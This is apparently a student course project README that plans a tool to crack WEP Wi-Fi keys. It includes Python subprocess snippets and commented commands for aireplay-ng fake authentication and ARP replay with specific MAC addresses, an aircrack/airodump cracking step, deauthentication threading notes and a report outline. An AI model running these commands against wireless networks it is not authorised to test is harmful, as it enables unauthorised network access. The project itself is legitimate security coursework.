# COMP4203 - Project



## Workflow





## To do:

### Implement Key Ranking

Could do this manually or use the algorithm `aircrack-ng` algorithm



### Verify Access Point

Verify that the access point is using the correct mode that enables the attack

```python
# aireplay-ng --fakeauth 0 -a C4:12:F5:7C:7C:0C -h d0:df:9a:8e:42:e9 wlp7s0
fake_auth = subprocess.Popen(
	['aireplay-ng', '--fakeauth 0', f'-a {access_point}', f'-h {source_mac}', iface], 
	stdout = subprocess.PIPE)
```



### Manage ARP Packets

Run the following passively until correct packets are found from the created requests?

```python
# aireplay-ng --arpreplay -b C4:12:F5:7C:7C:0C -h d0:df:9a:8e:42:e9 wlp7s0
arpreplay = subprocess.Popen(['aireplay-ng', '--arpreplay', f'-b {access_point}', f'-h {source_mac}', iface], stdout = subprocess.PIPE)
```



### Start Attack

After everything else is done (right number of packets captured) start cracking...

```python
# aircrack-ng <file_name>
aircrack = subprocess.Popen(['airodump-ng', 'output.cap'], stdout = subprocess.PIPE)
```



### Allow Selecting Any Interface?

Might be able to use 2 interfaces if you are on a wired connection and have a network card I guess... Could make it faster

```python
iface = 'wlan0'
```



### Threadding

Run line 101 happens first, wait until completed

Start line 115 constantly running until IV count reaches threshold, 20k?

Start running line 114

Line 103 constantly running 

Line 106 loop should run until we successfully deauthenticate once



## Report Structure

link to the doc ryan made instead

```
- Title page
    - Title
    - Names
    - Course
    - Date 
  
- Abstract? 

- Table of contents + list of figures + list of tabless...

- Introduction
    - Motivation
    - Purpose
    - Description and domain
    
- Literature review
    - Talk about that paper and how it works...
    
- Design
    - Approach and discuss logic...
    
- Implementation
    - Talk about our specific code
        - Deauth
        - Key ranking
    - Talk about limitations
    
- Results
    - Talk about simulations we ran and discuss results
    - Compare performance against existing paper and against goals

- Conclusion
    - Conclude that the paper was valid

- References

- Appendices
```

